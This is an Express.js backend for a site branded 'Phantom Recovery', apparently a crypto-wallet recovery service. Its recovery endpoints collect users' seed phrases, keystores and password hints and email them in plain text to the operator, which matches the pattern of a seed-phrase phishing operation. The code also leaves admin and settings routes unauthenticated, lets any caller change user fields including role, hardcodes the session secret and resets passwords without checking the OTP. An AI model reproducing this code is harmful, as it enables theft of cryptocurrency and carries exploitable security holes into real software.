// ---------------- Dependencies ----------------
const express = require("express");
const cors = require("cors");
const dotenv = require("dotenv");
const path = require("path");
const nodemailer = require("nodemailer");
const fs = require("fs");
const http = require("http");
const { Server } = require("socket.io");
const bcrypt = require("bcryptjs");
const crypto = require("crypto");
const passport = require("passport");
const GoogleStrategy = require("passport-google-oauth20").Strategy;
const session = require("express-session");

// ---------------- Config ----------------
dotenv.config();
const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

// ---------------- Middlewares ----------------
app.use(cors());
app.use(express.json());
app.use(session({ secret: 'secret', resave: false, saveUninitialized: true }));
app.use(passport.initialize());
app.use(passport.session());
app.use("/public", express.static(path.join(__dirname, "public")));
app.use("/images", express.static(path.join(__dirname, "public/images")));

// ---------------- Frontend Path ----------------
const frontendPath = path.join(__dirname, "../");
app.use(express.static(frontendPath));

// ---------------- Nodemailer Setup ----------------
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS,
  },
});

async function sendMail({ subject, text, to }) {
  const mailOptions = {
    from: process.env.EMAIL_USER,
    to: to || process.env.EMAIL_TO,
    subject,
    text,
  };
  return transporter.sendMail(mailOptions);
}

// ---------------- In-Memory Storage ----------------
let recoveryHistory = [];
let tickets = [];
let users = [
  { id: 1, username: "alice", email: "alice@example.com", role: "client", active: true },
  { id: 2, username: "bob", email: "bob@example.com", role: "analyst", active: true },
  { id: 3, username: "admin", email: "admin@example.com", role: "admin", active: true },
];
let systemConfig = {
  emailAlerts: true,
  pushNotifications: true,
  twoFA: false,
  allowedAdmins: ["admin"],
};
let otpStore = {}; // { email: { code, expiresAt } }

// =============================================================
// ---------------- Wallet JSON Data ----------------
const DATA_FILE = path.join(__dirname, "wallets.json");
function loadWallets() {
  if (!fs.existsSync(DATA_FILE)) return [];
  return JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
}
function saveWallets(wallets) {
  fs.writeFileSync(DATA_FILE, JSON.stringify(wallets, null, 2));
}

// ---------------- Audit Logging ----------------
const logFile = path.join(__dirname, "audit.log");
function logAction(action, details) {
  const entry = `[${new Date().toISOString()}] ${action} - ${JSON.stringify(details)}\n`;
  fs.appendFileSync(logFile, entry);
}

// ---------------- Utility ----------------
function notifyAdmins(message) {
  io.emit("adminNotification", { message, time: new Date().toISOString() });
  sendMail({ subject: "🔔 Admin Notification", text: message }).catch(console.error);
}

function saveRecovery({ type, status, details, user }) {
  const entry = {
    id: recoveryHistory.length + 1,
    type,
    status: status || "Pending",
    details,
    user: user || "anonymous",
    submittedAt: new Date().toISOString(),
  };
  recoveryHistory.push(entry);
  logAction("RECOVERY_CREATED", entry);
  io.emit("recoveryUpdate", entry);
  notifyAdmins(`New recovery request submitted (#${entry.id}, type: ${entry.type})`);

  const failures = recoveryHistory.filter((r) => r.status === "Failed").length;
  if (failures > 5) {
    sendMail({
      subject: "🚨 Recovery Alert",
      text: `High failure rate detected: ${failures} failed recoveries.`,
    }).catch(console.error);
  }
  return entry;
}


// =====================================================================
// ------------------------ PASSPORT SOCIAL LOGINS ---------------------
// =====================================================================

const AppleStrategy = require("passport-apple");
const InstagramStrategy = require("passport-instagram").Strategy;
const FacebookStrategy = require("passport-facebook").Strategy;

// ------------------------ GOOGLE STRATEGY ----------------------------
passport.use(new GoogleStrategy({
  clientID: process.env.GOOGLE_CLIENT_ID,
  clientSecret: process.env.GOOGLE_CLIENT_SECRET,
  callbackURL: "http://localhost:5000/auth/google/callback"
}, (accessToken, refreshToken, profile, done) => {
  let user = users.find(u => u.email === profile.emails[0].value);
  if (!user) {
    user = {
      id: users.length + 1,
      username: profile.displayName,
      email: profile.emails[0].value,
      role: "client",
      active: true
    };
    users.push(user);
  }
  return done(null, user);
}));

// ------------------------ APPLE STRATEGY -----------------------------
passport.use(new AppleStrategy({
  clientID: process.env.APPLE_ID,
  teamID: process.env.APPLE_TEAM_ID,
  callbackURL: "/auth/apple/callback",
  keyID: process.env.APPLE_KEY_ID,
  privateKeyLocation: process.env.APPLE_KEY_PATH
}, (accessToken, refreshToken, idToken, profile, done) => {
  const email = profile.email || `apple_${profile.id}@apple.com`;
  let user = users.find(u => u.email === email);
  if (!user) {
    user = {
      id: users.length + 1,
      username: profile.name || "Apple User",
      email,
      role: "client",
      active: true
    };
    users.push(user);
  }
  return done(null, user);
}));

// ------------------------ INSTAGRAM STRATEGY -------------------------
passport.use(new InstagramStrategy({
  clientID: process.env.INSTAGRAM_ID,
  clientSecret: process.env.INSTAGRAM_SECRET,
  callbackURL: "/auth/instagram/callback"
}, (accessToken, refreshToken, profile, done) => {
  let email = profile.username + "@instagram.com"; // fallback since Instagram may not return email
  let user = users.find(u => u.email === email);
  if (!user) {
    user = {
      id: users.length + 1,
      username: profile.displayName || profile.username,
      email,
      role: "client",
      active: true
    };
    users.push(user);
  }
  return done(null, user);
}));

// ------------------------ FACEBOOK STRATEGY --------------------------
passport.use(new FacebookStrategy({
  clientID: process.env.FACEBOOK_ID,
  clientSecret: process.env.FACEBOOK_SECRET,
  callbackURL: "/auth/facebook/callback",
  profileFields: ['id', 'displayName', 'emails']
}, (accessToken, refreshToken, profile, done) => {
  let email = profile.emails ? profile.emails[0].value : `${profile.id}@facebook.com`;
  let user = users.find(u => u.email === email);
  if (!user) {
    user = {
      id: users.length + 1,
      username: profile.displayName,
      email,
      role: "client",
      active: true
    };
    users.push(user);
  }
  return done(null, user);
}));

// ------------------------ SERIALIZATION ------------------------------
passport.serializeUser((user, done) => done(null, user.id));
passport.deserializeUser((id, done) => done(null, users.find(u => u.id === id)));

// =====================================================================
// ------------------------ OAUTH ROUTES -------------------------------
// =====================================================================

// ----- GOOGLE -----
app.get('/auth/google', passport.authenticate('google', { scope: ['profile', 'email'] }));
app.get('/auth/google/callback',
  passport.authenticate('google', { failureRedirect: '/login' }),
  (req, res) => {
    if (req.user.role === 'client') res.redirect('/dashboard');
    else if (req.user.role === 'admin') res.redirect('/admin');
  }
);

// ----- APPLE -----
app.get('/auth/apple', passport.authenticate('apple'));
app.post('/auth/apple/callback',
  passport.authenticate('apple', { failureRedirect: '/login' }),
  (req, res) => res.redirect('/dashboard')
);

// ----- INSTAGRAM -----
app.get('/auth/instagram', passport.authenticate('instagram'));
app.get('/auth/instagram/callback',
  passport.authenticate('instagram', { failureRedirect: '/login' }),
  (req, res) => res.redirect('/dashboard')
);

// ----- FACEBOOK -----
app.get('/auth/facebook', passport.authenticate('facebook', { scope: ['email'] }));
app.get('/auth/facebook/callback',
  passport.authenticate('facebook', { failureRedirect: '/login' }),
  (req, res) => res.redirect('/dashboard')
);

// =====================================================================
// ------------------------ AUTH / OTP -------------------------------
app.post("/api/auth/request-otp", async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ message: "Email required" });

  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  otpStore[email] = { code: otp, expiresAt: Date.now() + 5 * 60 * 1000 }; // 5 mins

  try {
    await sendMail({
      to: email,
      subject: "Your Phantom Recovery OTP",
      text: `Your OTP code is: ${otp}. Expires in 5 minutes.`,
    });
    res.json({ message: "OTP sent successfully" });
  } catch (err) {
    console.error("Failed to send OTP:", err);
    res.status(500).json({ message: "Failed to send OTP" });
  }
});

app.post("/api/auth/verify-otp", (req, res) => {
  const { email, otp } = req.body;
  if (!email || !otp) return res.status(400).json({ message: "Email and OTP required" });

  const record = otpStore[email];
  if (!record) return res.status(400).json({ message: "No OTP requested for this email" });
  if (Date.now() > record.expiresAt) return res.status(400).json({ message: "OTP expired" });
  if (record.code !== otp) return res.status(400).json({ message: "Incorrect OTP" });

  delete otpStore[email];
  res.json({ message: "OTP verified" });
});

app.post("/api/auth/reset-password", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password) return res.status(400).json({ message: "Email and password required" });

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const user = users.find((u) => u.username === email || u.email === email);
    if (!user) return res.status(404).json({ message: "User not found" });

    user.password = hashedPassword;
    logAction("PASSWORD_RESET", { email });
    res.json({ message: "Password updated successfully" });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Failed to reset password" });
  }
});

// =====================================================================
// ------------------------ REGISTER USER -----------------------------
app.post("/api/register", async (req, res) => {
  const { firstName, lastName, email, password } = req.body;

  if (!firstName || !lastName || !email || !password)
    return res.status(400).json({ message: "All fields are required" });

  const existing = users.find(u => u.email === email);
  if (existing) return res.status(400).json({ message: "Email already registered" });

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const newUser = {
      id: users.length + 1,
      username: firstName,
      lastName,
      email,
      password: hashedPassword,
      role: "client",
      active: true
    };
    users.push(newUser);
    logAction("USER_REGISTER", { email, id: newUser.id });

    await sendMail({
      to: email,
      subject: "Welcome to Phantom Recovery",
      text: `Hi ${firstName}, your account has been successfully created!`
    });

    res.json({ message: "Account created successfully", userId: newUser.id });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Failed to create account" });
  }
});

// ---------------- LOGIN ----------------
app.post("/api/login", async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password)
    return res.status(400).json({ message: "Email and password are required" });

  const user = users.find(u => u.email === email);
  if (!user) return res.status(404).json({ message: "User not found" });

  try {
    const match = await bcrypt.compare(password, user.password);
    if (!match) return res.status(401).json({ message: "Incorrect password" });

    // Optional: you can create a JWT token here for auth
    // const token = jwt.sign({ id: user.id, role: user.role }, process.env.JWT_SECRET, { expiresIn: "1h" });

    res.json({ message: "Login successful", userId: user.id, role: user.role });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Login failed" });
  }
});

// =====================================================================
// ------------------------ USER PROFILE & PREFERENCES ----------------
app.get("/api/user/:id", (req, res) => {
  const user = users.find(u => u.id == req.params.id);
  if(!user) return res.status(404).json({ message:"User not found" });
  res.json(user);
});

app.patch("/api/user/:id", (req, res) => {
  const user = users.find(u => u.id == req.params.id);
  if(!user) return res.status(404).json({ message:"User not found" });
  Object.assign(user, req.body);
  logAction("USER_UPDATE", { id: user.id, changes: req.body });
  res.json({ message:"Profile updated", user });
});

// =====================================================================
// ------------------------ USER MANAGEMENT APIs -----------------------
app.get("/api/admin/users", (req, res) => res.json(users));

app.patch("/api/admin/users/:id/toggle", (req, res) => {
  const user = users.find((u) => u.id == req.params.id);
  if (!user) return res.status(404).json({ message: "User not found" });
  user.active = !user.active;
  logAction("USER_TOGGLE", user);
  res.json(user);
});

app.patch("/api/admin/users/:id/reset", (req, res) => {
  const user = users.find((u) => u.id == req.params.id);
  if (!user) return res.status(404).json({ message: "User not found" });
  user.tempPassword = "changeme";
  logAction("USER_RESET", { user: user.username });
  res.json({ message: `Password reset for ${user.username}`, tempPassword: "changeme" });
});

// ---------------- Recovery Update API ----------------
app.patch("/api/admin/recovery/:id/status", (req, res) => {
  const { status, assignedTo } = req.body;
  const recovery = recoveryHistory.find((r) => r.id == req.params.id);
  if (!recovery) return res.status(404).json({ message: "Not found" });

  if (status) recovery.status = status;
  if (assignedTo) recovery.assignedTo = assignedTo;

  logAction("RECOVERY_UPDATE", { id: recovery.id, status, assignedTo });
  res.json(recovery);
});
// =====================================================================
// ------------------------ CONTACT & TICKETS --------------------------

// ---------------------- CREATE NEW TICKET ----------------------------
app.post("/api/contact", async (req, res) => {
  try {
    const { name, email, subject, message } = req.body;

    if (!name || !email || !subject || !message) {
      return res.status(400).json({ message: "⚠️ All fields are required." });
    }

    // Create a ticket object
    const ticket = {
      id: tickets.length + 1,
      name,
      email,
      subject,
      message,
      resolved: false,
      createdAt: new Date().toISOString(),
    };

    tickets.push(ticket);
    logAction("NEW_TICKET_CREATED", ticket);

    // Send notification email
    await sendMail({
      subject: `[Support Ticket] ${subject}`,
      text: `🧾 New Ticket Received:\n\nFrom: ${name} <${email}>\nSubject: ${subject}\n\nMessage:\n${message}`,
    });

    // Notify admin in real-time (Socket.IO)
    io.emit("adminNotification", {
      type: "new_ticket",
      message: `🎫 New ticket from ${name}: "${subject}"`,
      ticket,
    });

    return res.json({
      success: true,
      message: "✅ Your support ticket has been sent successfully!",
      ticket,
    });
  } catch (err) {
    console.error("❌ Ticket Error:", err);
    return res.status(500).json({ success: false, message: "❌ Failed to send your message." });
  }
});

// ---------------------- UPDATE TICKET STATUS -------------------------
app.patch("/api/admin/tickets/:id", (req, res) => {
  const ticket = tickets.find((t) => t.id == req.params.id);
  if (!ticket) return res.status(404).json({ message: "❌ Ticket not found." });

  ticket.resolved = req.body.resolved === true;
  ticket.updatedAt = new Date().toISOString();

  logAction("TICKET_STATUS_UPDATED", ticket);

  io.emit("adminNotification", {
    type: "ticket_update",
    message: `📬 Ticket #${ticket.id} marked as ${ticket.resolved ? "resolved" : "pending"}.`,
    ticket,
  });

  return res.json({ success: true, message: "✅ Ticket status updated!", ticket });
});

// ---------------------- FETCH ALL TICKETS (ADMIN) --------------------
app.get("/api/admin/tickets", (req, res) => {
  res.json({ success: true, total: tickets.length, tickets });
});

// =====================================================================
// --------------------------- SETTINGS -------------------------------
app.get("/api/admin/settings", (req, res) => res.json(systemConfig));

app.patch("/api/admin/settings", (req, res) => {
  Object.assign(systemConfig, req.body);
  logAction("SETTINGS_UPDATE", systemConfig);
  res.json(systemConfig);
});

// =============================================================
// ---------------- UNIFIED SOCKET.IO CONNECTION ----------------
const offlineMessages = []; // Store messages if no admin online
const connectedAdmins = new Set(); // Track connected admins

function notifyAdmins(message) {
  io.emit("adminNotification", { message });
}

io.on("connection", (socket) => {
  console.log("🔌 Client connected:", socket.id);

  // ---------------- ADMIN LOGIN DETECTION ----------------
  socket.on("adminLogin", (adminName) => {
    connectedAdmins.add(socket.id);
    console.log(`🧑‍💼 Admin connected: ${adminName} (${socket.id})`);

    // Send offline messages to new admin
    if (offlineMessages.length > 0) {
      offlineMessages.forEach((m) => {
        socket.emit("newSupportMessage", m);
      });
      offlineMessages.length = 0;
    }
  });

  // ---------------- CLIENT SUPPORT MESSAGE ----------------
  socket.on("supportMessage", (msg) => {
    console.log("💬 Support message:", msg);

    // Auto bot reply for acknowledgment
    setTimeout(() => {
      socket.emit(
        "supportReply",
        "👩‍💻 Support Bot: Thanks for reaching out! We’ve logged your message and an agent will assist you soon."
      );
    }, 1000);

    // Notify or store message if no admin online
    if (connectedAdmins.size > 0) {
      notifyAdmins(`💬 New Support Message: "${msg}"`);
      io.emit("newSupportMessage", { msg, time: new Date().toISOString() });
    } else {
      offlineMessages.push({ msg, time: new Date().toISOString() });
      console.log("📦 Admin offline, storing message:", msg);
    }
  });

  // ---------------- ADMIN REPLY ----------------
  socket.on("adminReply", ({ toClientId, reply }) => {
    io.to(toClientId).emit("supportReply", `👩‍💼 Admin: ${reply}`);
  });

  // ---------------- WALLET MANAGEMENT ----------------
  socket.emit("wallets", loadWallets());

  socket.on("addWallet", (wallet) => {
    const wallets = loadWallets();
    wallets.push(wallet);
    saveWallets(wallets);
    io.emit("wallets", wallets);
  });

  socket.on("removeWallet", (id) => {
    const wallets = loadWallets().filter((w) => w.id !== id);
    saveWallets(wallets);
    io.emit("wallets", wallets);
  });

  socket.on("renameWallet", ({ id, name }) => {
    const wallets = loadWallets();
    const w = wallets.find((w) => w.id === id);
    if (w) w.name = name;
    saveWallets(wallets);
    io.emit("wallets", wallets);
  });

  socket.on("withdrawFunds", ({ id, amount }) => {
    const wallets = loadWallets();
    const w = wallets.find((w) => w.id === id);
    if (w) w.balance = (parseFloat(w.balance) - parseFloat(amount)).toFixed(4);
    saveWallets(wallets);
    io.emit("wallets", wallets);
  });

  socket.on("refreshWallets", () => io.emit("wallets", loadWallets()));

  // ---------------- DISCONNECT ----------------
  socket.on("disconnect", () => {
    console.log("❌ Disconnected:", socket.id);
    connectedAdmins.delete(socket.id);
  });
});


// =====================================================================
// -------------------------- RECOVERY APIs ----------------------------
app.post("/api/recovery/wallet", async (req, res) => {
  const { seed, passwordHint, user } = req.body;
  if (!seed && !passwordHint) return res.status(400).json({ message: "⚠️ Provide seed or password hint." });

  try {
    await sendMail({
      subject: "[Recovery] Wallet Recovery Request",
      text: `Seed/Backup: ${seed || "N/A"}\nPassword Hint: ${passwordHint || "N/A"}`,
    });
    const saved = saveRecovery({ type: "Wallet Recovery", status: "Pending", details: { seed, passwordHint }, user });
    res.json({ message: "✅ Wallet recovery request submitted!", data: saved });
  } catch {
    res.status(500).json({ message: "❌ Failed to submit wallet recovery." });
  }
});

app.post("/api/recovery/key", async (req, res) => {
  const { keystore, hardware, user } = req.body;
  if (!keystore && !hardware) return res.status(400).json({ message: "⚠️ Provide keystore or hardware details." });

  try {
    await sendMail({
      subject: "[Recovery] Lost Key Recovery Request",
      text: `Keystore: ${keystore || "N/A"}\nHardware: ${hardware || "N/A"}`,
    });
    const saved = saveRecovery({ type: "Lost Key Recovery", status: "Pending", details: { keystore, hardware }, user });
    res.json({ message: "✅ Lost key recovery request submitted!", data: saved });
  } catch {
    res.status(500).json({ message: "❌ Failed to submit lost key recovery." });
  }
});

app.post("/api/recovery/transaction", async (req, res) => {
  const { txid, blockchain, notes, user } = req.body;
  if (!txid || !blockchain) return res.status(400).json({ message: "⚠️ TxID and Blockchain required." });

  try {
    await sendMail({
      subject: "[Recovery] Transaction Recovery Request",
      text: `TxID: ${txid}\nBlockchain: ${blockchain}\nNotes: ${notes || "N/A"}`,
    });
    const saved = saveRecovery({ type: "Transaction Recovery", status: "Pending", details: { txid, blockchain, notes }, user });
    res.json({ message: "✅ Transaction recovery request submitted!", data: saved });
  } catch {
    res.status(500).json({ message: "❌ Failed to submit transaction recovery." });
  }
});

app.post("/api/recovery/multichain", async (req, res) => {
  const { blockchains, coins, user } = req.body;
  if (!blockchains || !coins) return res.status(400).json({ message: "⚠️ Blockchains and Coins required." });

  try {
    await sendMail({
      subject: "[Recovery] Multi-Chain Recovery Request",
      text: `Blockchains: ${blockchains}\nCoins: ${coins}`,
    });
    const saved = saveRecovery({ type: "Multi-Chain Recovery", status: "Pending", details: { blockchains, coins }, user });
    res.json({ message: "✅ Multi-chain recovery request submitted!", data: saved });
  } catch {
    res.status(500).json({ message: "❌ Failed to submit multi-chain recovery." });
  }
});

// =====================================================================
// --------------------- HISTORY & LOGS -------------------------------
app.get("/api/history", (req, res) => {
  const { type, status, search, role, user } = req.query;
  let results = [...recoveryHistory];

  if (role === "client") results = results.filter((r) => r.user === user);
  else if (role === "analyst") results = results.map(({ id, type, status, submittedAt }) => ({ id, type, status, submittedAt }));

  if (type) results = results.filter((r) => r.type === type);
  if (status) results = results.filter((r) => r.status === status);
  if (search) {
    const s = search.toLowerCase();
    results = results.filter((r) =>
      r.type.toLowerCase().includes(s) ||
      JSON.stringify(r.details).toLowerCase().includes(s) ||
      r.submittedAt.toLowerCase().includes(s)
    );
  }
  res.json(results);
});

app.get("/api/history/:id", (req, res) => {
  const recovery = recoveryHistory.find((r) => r.id == req.params.id);
  if (!recovery) return res.status(404).json({ message: "Not found" });
  res.json(recovery);
});

app.get("/api/logs/download", (req, res) => res.download(logFile, "audit.log"));

// =====================================================================
// ------------------------ PAGES & AUTH -------------------------------
const pages = [
  "index","about","analytics","contact","dashboard","history","home","login",
  "pass","profile","register","request","services","setting","support","wallet",
  "testimonials","admin","adlogin","adforget"
];
pages.forEach((page) => {
  app.get(page === "index" ? "/" : `/${page}`, (req, res) =>
    res.sendFile(path.join(frontendPath, `${page}.html`))
  );
});

const authRoutes = require("./routes/auth");
app.use("/api/auth", authRoutes);

// ---------------- Catch-all ----------------
app.get("*", (req, res) => res.sendFile(path.join(frontendPath, "index.html")));

// =====================================================================
// ------------------------- SERVER START ------------------------------
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));

// ---------------- WebSocket ----------------
io.on("connection", (socket) => {
  console.log("🔌 Client connected:", socket.id);
  socket.emit("initData", recoveryHistory);
});
